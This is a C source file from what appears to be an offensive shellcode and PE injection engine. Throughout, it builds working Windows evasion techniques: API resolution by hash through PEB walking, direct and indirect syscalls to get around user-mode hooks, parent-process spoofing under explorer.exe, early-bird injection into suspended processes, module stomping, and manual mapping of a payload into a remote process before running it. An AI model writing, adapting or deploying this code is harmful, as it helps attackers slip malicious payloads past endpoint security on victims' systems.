#include "engine.h"
#include "ps-utils.h"
#include "peb-eat-utils.h"
#include "syscall-utils.h"
#include "resolver.h"

#include "hash_loader.h"
#include "hashed_values.h"

#include "unwindraven_integration.h"

#include <stdio.h>

#define LOCAL_PROCESS_HANDLE ((HANDLE)(LONG_PTR)-1)

static LOCAL_LOADER_CONTEXT g_EnvContext = { 0 };

P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
P_VirtualProtect      g_VirtualProtect      = NULL;
P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
P_WriteProcessMemory  g_WriteProcessMemory  = NULL;
P_CreateRemoteThread  g_CreateRemoteThread  = NULL;
P_WaitForSingleObject g_WaitForSingleObject = NULL;

// indirect syscall SSNs
DWORD    wNtAllocateVirtualMemorySSN      = 0;
DWORD    wNtProtectVirtualMemorySSN       = 0;
DWORD    wNtWriteVirtualMemorySSN         = 0;
DWORD    wNtCreateThreadExSSN             = 0;
DWORD    wNtWaitForSingleObjectSSN        = 0;
DWORD    wNtQueueApcThreadSSN             = 0;
DWORD    wNtResumeThreadSSN               = 0;
DWORD    wNtQueryVirtualMemorySSN         = 0;

// function addresses
UINT_PTR sysAddrNtAllocateVirtualMemory   = 0;
UINT_PTR sysAddrNtProtectVirtualMemory    = 0;
UINT_PTR sysAddrNtWriteVirtualMemory      = 0;
UINT_PTR sysAddrNtCreateThreadEx          = 0;
UINT_PTR sysAddrNtWaitForSingleObject     = 0;
UINT_PTR sysAddrNtQueueApcThread          = 0;
UINT_PTR sysAddrNtResumeThread            = 0;
UINT_PTR sysAddrNtQueryVirtualMemory      = 0;

#ifdef _WIN64
#define RELOC_TYPE IMAGE_REL_BASED_DIR64
#else
#define RELOC_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

static BOOL IsPayloadPE(LPCVOID pPayload) {
    if (!pPayload) return FALSE;

    const BYTE *pRaw = (const BYTE *)pPayload;
    const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER *)pRaw;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    const IMAGE_NT_HEADERS *pNt =
        (const IMAGE_NT_HEADERS *)(pRaw + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    return TRUE;
}

static BOOL WriteBufferFlavorAware(PINJECTION_CONTEXT ctx,
                                   PBYTE dest,
                                   PBYTE src,
                                   SIZE_T size)
{
    SIZE_T written = 0;

    // Local process → memcpy
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(dest, src, size);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    // Remote process → flavor-aware
    switch (ctx->writeFlavor)
    {
        case FLAVOR_WIN32:
            return WriteProcessMemory(ctx->hProcess,
                                      dest,
                                      src,
                                      size,
                                      &written);

        case FLAVOR_DFR:
            if (!g_WriteProcessMemory)
                return FALSE;
            return g_WriteProcessMemory(ctx->hProcess,
                                        dest,
                                        src,
                                        size,
                                        &written);

        case FLAVOR_DIRECT: {
            NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess,
                                                      dest,
                                                      src,
                                                      size,
                                                      &written);
            return (status == 0 && written == size);
        }

        case FLAVOR_INDIRECT: {
            NTSTATUS status = IndirectSysNtWriteVirtualMemory(ctx->hProcess,
                                                              dest,
                                                              src,
                                                              size,
                                                              &written);
            return (status == 0 && written == size);
        }

        default:
            return FALSE;
    }
}

//
// Flavor-aware ManualMapWrite
//
BOOL ManualMapWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload)
{
    if (!ctx || !pPayload || ctx->pRemoteAddress == NULL)
        return FALSE;

    PBYTE pRaw  = (PBYTE)pPayload;
    PBYTE pDest = (PBYTE)ctx->pRemoteAddress;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pRaw;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders =
        (PIMAGE_NT_HEADERS)(pRaw + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    //
    // 1. Write PE headers
    //
    if (!WriteBufferFlavorAware(ctx,
                                pDest,
                                pRaw,
                                pNtHeaders->OptionalHeader.SizeOfHeaders))
        return FALSE;

    //
    // 2. Write sections
    //
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (pSection[i].SizeOfRawData == 0)
            continue;

        PBYTE pSectionDest = pDest + pSection[i].VirtualAddress;
        PBYTE pSectionSrc  = pRaw  + pSection[i].PointerToRawData;

        if (!WriteBufferFlavorAware(ctx,
                                    pSectionDest,
                                    pSectionSrc,
                                    pSection[i].SizeOfRawData))
            return FALSE;
    }

    //
    // 3. Relocations (local only)
    //
    if (ctx->hProcess == (HANDLE)-1)
    {
        ULONG_PTR delta = (ULONG_PTR)pDest - pNtHeaders->OptionalHeader.ImageBase;

        if (delta != 0)
        {
            IMAGE_DATA_DIRECTORY relocDir =
                pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            if (relocDir.VirtualAddress != 0 &&
                relocDir.Size > 0)
            {
                PIMAGE_BASE_RELOCATION pRelocBlock =
                    (PIMAGE_BASE_RELOCATION)(pDest + relocDir.VirtualAddress);

                while (pRelocBlock->VirtualAddress != 0 &&
                       pRelocBlock->SizeOfBlock > 0)
                {
                    DWORD entryCount =
                        (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                        sizeof(WORD);

                    PWORD pEntries =
                        (PWORD)((PBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

                    for (DWORD i = 0; i < entryCount; i++)
                    {
                        WORD type   = pEntries[i] >> 12;
                        WORD offset = pEntries[i] & 0x0FFF;

                        if (type == RELOC_TYPE)
                        {
                            ULONG_PTR *pPatchTarget =
                                (ULONG_PTR *)(pDest +
                                              pRelocBlock->VirtualAddress +
                                              offset);
                            *pPatchTarget += delta;
                        }
                    }

                    pRelocBlock =
                        (PIMAGE_BASE_RELOCATION)((PBYTE)pRelocBlock +
                                                 pRelocBlock->SizeOfBlock);
                }
            }
        }
    }

    return TRUE;
}

BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
{
    //
    // Debug: show per-stage flavors
    //
    printf("[DEBUG] ctx->allocFlavor: %d\n",   ctx->allocFlavor);
    printf("[DEBUG] ctx->writeFlavor: %d\n",   ctx->writeFlavor);
    printf("[DEBUG] ctx->protectFlavor: %d\n", ctx->protectFlavor);
    printf("[DEBUG] ctx->invokeFlavor: %d\n",  ctx->invokeFlavor);

    //
    // Per-stage DFR needs
    //
    BOOL needDFRAlloc   = (ctx->allocFlavor   == FLAVOR_DFR);
    BOOL needDFRWrite   = (ctx->writeFlavor   == FLAVOR_DFR);
    BOOL needDFRProtect = (ctx->protectFlavor == FLAVOR_DFR);
    BOOL needDFRInvoke  = (ctx->invokeFlavor  == FLAVOR_DFR);

    BOOL needDFR = needDFRAlloc || needDFRWrite || needDFRProtect || needDFRInvoke;

    if (needDFR)
        printf("[DEBUG] DFR is required.\n");
    else
        printf("[DEBUG] DFR is NOT required.\n");

    //
    // Per-stage Indirect needs
    //
    BOOL needIndirectAlloc   = (ctx->allocFlavor   == FLAVOR_INDIRECT);
    BOOL needIndirectWrite   = (ctx->writeFlavor   == FLAVOR_INDIRECT);
    BOOL needIndirectProtect = (ctx->protectFlavor == FLAVOR_INDIRECT);
    BOOL needIndirectInvoke  = (ctx->invokeFlavor  == FLAVOR_INDIRECT);

    BOOL needIndirect = needIndirectAlloc || needIndirectWrite || needIndirectProtect || needIndirectInvoke;

    if (needIndirect)
        printf("[DEBUG] Indirect Resolution is required.\n");
    else
        printf("[DEBUG] Indirect Resolution is NOT required.\n");

    //
    // Initialize DFR resolver (kernel32 exports) — only what’s needed
    //
    if (needDFR)
    {
#if defined(_WIN64)
        PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

        printf("[*] Initializing DFR resolver...\n");

        //HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        PVOID hKernel32 =
            GetModuleBaseManualHV(
                LOCAL_PROCESS_HANDLE,
                pPeb,
                &hv_kernel32
            );
        if (!hKernel32)
        {
            printf("[ERROR] Failed to get kernel32.dll\n");
            return FALSE;
        }

        if (needDFRAlloc)
        {
            /*g_VirtualAllocEx =
                (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");*/

            g_VirtualAllocEx = (P_VirtualAllocEx)GetProcAddressManualHV(
                LOCAL_PROCESS_HANDLE,
                hKernel32,
                &hv_VirtualAllocEx);
            if (!g_VirtualAllocEx)
            {
                printf("[ERROR] Failed to resolve VirtualAllocEx for DFR alloc.\n");
                return FALSE;
            }
        }

        if (needDFRWrite)
        {            
            /*g_WriteProcessMemory =
                (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");*/
            g_WriteProcessMemory = (P_WriteProcessMemory)GetProcAddressManualHV(
                LOCAL_PROCESS_HANDLE,
                hKernel32,
                &hv_WriteProcessMemory);

            if (!g_WriteProcessMemory)
            {
                printf("[ERROR] Failed to resolve WriteProcessMemory for DFR write.\n");
                return FALSE;
            }
        }

        if (needDFRProtect)
        {
            /*g_VirtualProtect =
                (P_VirtualProtect)GPAManualByName(hKernel32, "VirtualProtect");*/
            g_VirtualProtect = (P_VirtualProtect)GetProcAddressManualHV(
                LOCAL_PROCESS_HANDLE,
                hKernel32,
                &hv_VirtualProtect);                
            /*g_VirtualProtectEx =
                (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");*/
            g_VirtualProtectEx = (P_VirtualProtectEx)GetProcAddressManualHV(
                LOCAL_PROCESS_HANDLE,
                hKernel32,
                &hv_VirtualProtectEx);
            if (!g_VirtualProtect || !g_VirtualProtectEx)
            {
                printf("[ERROR] Failed to resolve VirtualProtect/VirtualProtectEx for DFR protect.\n");
                return FALSE;
            }
        }

        if (needDFRInvoke)
        {
            /*g_CreateRemoteThread =
                (P_CreateRemoteThread)GPAManualByName(hKernel32, "CreateRemoteThread");*/
            g_CreateRemoteThread = (P_CreateRemoteThread)GetProcAddressManualHV(
                LOCAL_PROCESS_HANDLE,
                hKernel32,
                &hv_CreateRemoteThread);                
            /*g_WaitForSingleObject =
                (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");*/
            g_WaitForSingleObject = (P_WaitForSingleObject)GetProcAddressManualHV(
                LOCAL_PROCESS_HANDLE,
                hKernel32,
                &hv_WaitForSingleObject);                

            if (!g_CreateRemoteThread || !g_WaitForSingleObject)
            {
                printf("[ERROR] Failed to resolve CreateRemoteThread/WaitForSingleObject for DFR invoke.\n");
                return FALSE;
            }
        }

        printf("[+] DFR resolver initialized.\n");
        if (needDFRAlloc)
            printf("  VirtualAllocEx      = %p\n", g_VirtualAllocEx);
        if (needDFRWrite)
            printf("  WriteProcessMemory  = %p\n", g_WriteProcessMemory);
        if (needDFRProtect)
        {
            printf("  VirtualProtect      = %p\n", g_VirtualProtect);
            printf("  VirtualProtectEx    = %p\n", g_VirtualProtectEx);
        }
        if (needDFRInvoke)
        {
            printf("  CreateRemoteThread  = %p\n", g_CreateRemoteThread);
            printf("  WaitForSingleObject = %p\n", g_WaitForSingleObject);
        }
    }

    //
    // Initialize Indirect resolver (SSNs + syscall addresses) — only what’s needed
    //
    if (needIndirect)
    {
        printf("[*] Initializing Indirect resolver...\n");

#if defined(_WIN64)
        PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

        //HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        PVOID hNtdll =
            GetModuleBaseManualHV(
                LOCAL_PROCESS_HANDLE,
                pPeb,
                &hv_ntdll
            );        
        if (!hNtdll)
        {
            printf("[ERROR] Failed to resolve ntdll.dll\n");
            return FALSE;
        }

        //
        // Alloc: NtAllocateVirtualMemory
        //
        if (needIndirectAlloc)
        {
            /*g_EnvContext.wNtAllocateVirtualMemorySSN =
                GetSSNByName(pPeb, "NtAllocateVirtualMemory");*/
            g_EnvContext.wNtAllocateVirtualMemorySSN =
                GetSSNByHash(pPeb, hv_ntdll, hv_NtAllocateVirtualMemory);

            /*g_EnvContext.sysAddrNtAllocateVirtualMemory =
                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory")); */
            g_EnvContext.sysAddrNtAllocateVirtualMemory =
                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtAllocateVirtualMemory)); 

            wNtAllocateVirtualMemorySSN    = g_EnvContext.wNtAllocateVirtualMemorySSN;
            sysAddrNtAllocateVirtualMemory = g_EnvContext.sysAddrNtAllocateVirtualMemory;
        }

        //
        // Write: NtWriteVirtualMemory
        //
        if (needIndirectWrite)
        {
            /*g_EnvContext.wNtWriteVirtualMemorySSN =
                GetSSNByName(pPeb, "NtWriteVirtualMemory");*/
            g_EnvContext.wNtWriteVirtualMemorySSN =
                GetSSNByHash(pPeb, hv_ntdll, hv_NtWriteVirtualMemory);                
            /*g_EnvContext.sysAddrNtWriteVirtualMemory =
                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));*/
            g_EnvContext.sysAddrNtWriteVirtualMemory =
                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtWriteVirtualMemory));

            wNtWriteVirtualMemorySSN    = g_EnvContext.wNtWriteVirtualMemorySSN;
            sysAddrNtWriteVirtualMemory = g_EnvContext.sysAddrNtWriteVirtualMemory;
        }

        //
        // Protect: NtProtectVirtualMemory
        //
        if (needIndirectProtect)
        {
            /*g_EnvContext.wNtProtectVirtualMemorySSN =
                GetSSNByName(pPeb, "NtProtectVirtualMemory");*/
            g_EnvContext.wNtProtectVirtualMemorySSN =
                GetSSNByHash(pPeb, hv_ntdll, hv_NtProtectVirtualMemory);                
            /*g_EnvContext.sysAddrNtProtectVirtualMemory =
                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));*/
            g_EnvContext.sysAddrNtProtectVirtualMemory =
                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtProtectVirtualMemory));
            wNtProtectVirtualMemorySSN    = g_EnvContext.wNtProtectVirtualMemorySSN;
            sysAddrNtProtectVirtualMemory = g_EnvContext.sysAddrNtProtectVirtualMemory;
        }

        //
        // Invoke: NtCreateThreadEx, NtWaitForSingleObject
        //
        if (needIndirectInvoke)
        {
            /*wNtCreateThreadExSSN      = GetSSNByName(pPeb, "NtCreateThreadEx");
            wNtWaitForSingleObjectSSN = GetSSNByName(pPeb, "NtWaitForSingleObject");*/

            wNtCreateThreadExSSN      = GetSSNByHash(pPeb, hv_ntdll, hv_NtCreateThreadEx);
            wNtWaitForSingleObjectSSN = GetSSNByHash(pPeb, hv_ntdll, hv_NtWaitForSingleObject);

            /*sysAddrNtCreateThreadEx      =
                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtCreateThreadEx"));
            sysAddrNtWaitForSingleObject =
                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));*/
            sysAddrNtCreateThreadEx      =
                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtCreateThreadEx));
            sysAddrNtWaitForSingleObject =
                (UINT_PTR)GetSyscallAddress(GPAManualByHash(hNtdll, hv_NtWaitForSingleObject));                
        }

        //
        // NtQueryVirtualMemory if any stage uses it (e.g., write/protect heuristics)
        //
        // NOTE: If you only need NtQueryVirtualMemory in indirect write/protect, you can gate it
        BOOL needQueryVM = needIndirectWrite || needIndirectProtect;
        if (needQueryVM)
        {
            //wNtQueryVirtualMemorySSN   = GetSSNByName(pPeb, "NtQueryVirtualMemory");
            wNtQueryVirtualMemorySSN   = GetSSNByHash(pPeb, hv_ntdll, hv_NtQueryVirtualMemory);
            /*
            sysAddrNtQueryVirtualMemory =
                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueryVirtualMemory"));*/
            sysAddrNtQueryVirtualMemory =
                (UINT_PTR)GetSyscallAddress(
                    GPAManualByHash(hNtdll, hv_NtQueryVirtualMemory)
                );
        }

        printf("[+] Indirect resolver initialized.\n");
        printf("[+] SSNs Loaded:\n");
        if (needIndirectAlloc)
            printf("  NtAllocateVirtualMemory(0x%X)\n", wNtAllocateVirtualMemorySSN);
        if (needIndirectWrite)
            printf("  NtWriteVirtualMemory(0x%X)\n",    wNtWriteVirtualMemorySSN);
        if (needIndirectProtect)
            printf("  NtProtectVirtualMemory(0x%X)\n",  wNtProtectVirtualMemorySSN);
        if (needIndirectInvoke)
        {
            printf("  NtCreateThreadEx(0x%X)\n",        wNtCreateThreadExSSN);
            printf("  NtWaitForSingleObject(0x%X)\n",   wNtWaitForSingleObjectSSN);
        }
        if (needQueryVM)
            printf("  NtQueryVirtualMemory(0x%X)\n",    wNtQueryVirtualMemorySSN);
    }

    return TRUE;
}

//
// todo: consider where to place arg parsing logic to determine if the user provided a spawnPath AND target PID
//
BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
    // if we have a spawnPath defined, we want to run it with PPID spoofing
    // by default, explorer.exe will be used as the PPID (variable: parentPid)
    if (ctx->spawnPath) {
#ifndef REFLECTIVE_PAYLOAD
        STARTUPINFOEXA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        SIZE_T attributeSize = 0;

        // get the PID for explorer.exe
        //DWORD parentPid = FindPidByName(L"explorer.exe");
        DWORD parentPid = FindPidByHash(&hv_explorer);
        if (parentPid == 0) return FALSE;

        // open a handle to the parent
        HANDLE hParent =
            OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
        if (!hParent) return FALSE;

        // initialize process thread attributes
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList =
            (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0,
                                                    attributeSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0,
                                          &attributeSize);
        UpdateProcThreadAttribute(si.lpAttributeList, 0,
                                  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                  &hParent, sizeof(HANDLE), NULL, NULL);

        // if we're performing EB injection we need to create the process in the suspended state                                  
        DWORD startupFlags = EXTENDED_STARTUPINFO_PRESENT;
        if (ctx->technique == EARLY_BIRD) {
            startupFlags |= CREATE_SUSPENDED;
        }

        // invoke CreateProcessA with the attributes we constructed
        if (!CreateProcessA(NULL,
                            ctx->spawnPath,
                            NULL,
                            NULL,
                            FALSE,
                            startupFlags,
                            NULL,
                            NULL,
                            &si.StartupInfo,
                            &pi)) {
            DeleteProcThreadAttributeList(si.lpAttributeList);
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            CloseHandle(hParent);
            return FALSE;
        }

        // set our context variables
        ctx->hProcess = pi.hProcess;
        ctx->hThread  = pi.hThread;

        // clean up after ourselves
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);

        return TRUE;
#else
        return FALSE;
#endif
    }

    // no PID means we target the current process and the logic is far simpler
    if (ctx->targetPid == 0) {
        printf("[*] No PID, using current process.\n");
        ctx->hProcess = (HANDLE)-1;
    } else {
#ifndef REFLECTIVE_PAYLOAD
        ctx->hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ctx->targetPid);
#endif
    }

    return ctx->hProcess != NULL;
}

char* flavorName(SYSCALL_FLAVOR f)
{
    switch (f) {
        case FLAVOR_WIN32:    return "WIN32";
        case FLAVOR_DFR:      return "DFR";
        case FLAVOR_DIRECT:   return "DIRECT";
        case FLAVOR_INDIRECT: return "INDIRECT";
        default:              return "UNKNOWN";
    }
}

BOOL EngineExecute(PINJECTION_ENGINE engine,
                   PINJECTION_CONTEXT ctx,
                   LPCVOID pPayload,
                   DWORD finalProtect)
{
    printf("[+] Initializing target.\n");
    InitializeTarget(ctx, ctx->allocFlavor);

    printf("[+] Initializing resolvers.\n");
    InitializeResolvers(ctx);
    
    // For module stomping, we need to locate the target address and set ctx->pRemoteAddress
    // todo: refactor this to move all the module stomping logic from EngineExecute
    if(ctx->enableStomping) {
        printf("[*] Module stomping is enabled.\n");
        printf("[*] Targeting module: %s.\n", ctx->targetModule);    
        printf("[*] Attempting to locate the module base for %s.\n", ctx->targetModule);
        LPVOID pPeb = GetPebAddressGeneric(ctx->hProcess);
        PVOID targetModuleBase = GetModuleBaseManualRemote(ctx->hProcess, pPeb, ctx->targetModule);
        if (!targetModuleBase) {
            printf("[ERROR] Failed to locate target module base.\n");
            CloseHandle(ctx->hProcess);
            return -1;        
        }

        printf("[*] Target DLL base located at: : 0x%016llx\n", (ULONG_PTR)targetModuleBase);        

        LPVOID bufferAddress = NULL;

        if(ctx->targetOffset != 0) {
            if(ctx->targetExport != NULL) {
                printf("[!] Warning: both a target export and a target offset were provided.\n    Prioritizing the offset value over the export name.\n    Double-check your parameters.\n");
            }
            printf("[*] Locating offset address: %ld.\n", ctx->targetOffset);
            printf("[*] Applying RVA offset 0x%X directly from Image Base\n", ctx->targetOffset);
            bufferAddress = (LPVOID)((PBYTE)targetModuleBase + ctx->targetOffset);
        } else if(ctx->targetExport != NULL) {
            printf("[*] Locating export address: %s.\n", ctx->targetExport);
            printf("[*] Attempting to locate function: %s\n", ctx->targetExport);
            bufferAddress = (LPVOID)GetRemoteProcAddressManual(ctx->hProcess, targetModuleBase, ctx->targetExport);  
            if (bufferAddress == NULL) {
                printf("[ERROR] Failed to locate target function %s! Error: %lu\n", ctx->targetExport, GetLastError());
                CloseHandle(ctx->hProcess);
                return -1;
            }        
            printf("[*] Target %s!%s located at: 0x%016llx\n", ctx->targetModule, ctx->targetExport, (ULONG_PTR)bufferAddress);
            ctx->pRemoteAddress = bufferAddress;
        } else {                    
            printf("[*] No export or offset provided, targeting the first exported function.\n");
            printf("[*] Found target module base at: 0x%p\n", targetModuleBase);

            // Use the base address to find the absolute address of the first export in the .text section
            PVOID pFirstExport = FindFirstExportInTextSectionGeneric(ctx->hProcess, targetModuleBase);

            if (pFirstExport == NULL) {
                printf("[-] Failed to find a valid executable export inside the .text section.\n");
                // Handle error or exit early
                return FALSE;
            }

            printf("[+] Successfully located first export entry point at: 0x%p\n", pFirstExport);
            ctx->pRemoteAddress = pFirstExport; 

            /*
            // Optional: Calculate the Relative Virtual Address (RVA) if needed for tracking
            PVOID exportRVA = (DWORD)((BYTE*)pFirstExport - (BYTE*)targetModuleBase);
            printf("[*] First export RVA: 0x%08X\n", exportRVA);   */
            
        }
    } else {              
        printf("[+] Starting allocation phase.\n");
        // allocate memory with RW permissions and populate ctx->pRemoteAddress
        if (!engine->Allocate(ctx, PAGE_READWRITE)) {
            printf("[!] Error: Allocation failed.\n");
            return FALSE;
        } 
        printf("[+] Space allocated RW at: 0x%p\n", ctx->pRemoteAddress);
    }

    if (IsPayloadPE(pPayload)) {
        printf("[+] Writing payload with ManualMapWrite.\n");
        ManualMapWrite(ctx, pPayload);
    } else {
        printf("[+] Writing payload.\n");
        engine->Write(ctx, pPayload);
    }

    printf("[+] Adjusting permissions.\n");
    DWORD oldProt = 0;
    engine->Protect(ctx, finalProtect, &oldProt);

    printf("[+] Invoking payload.\n");
    return engine->Invoke(ctx);
}
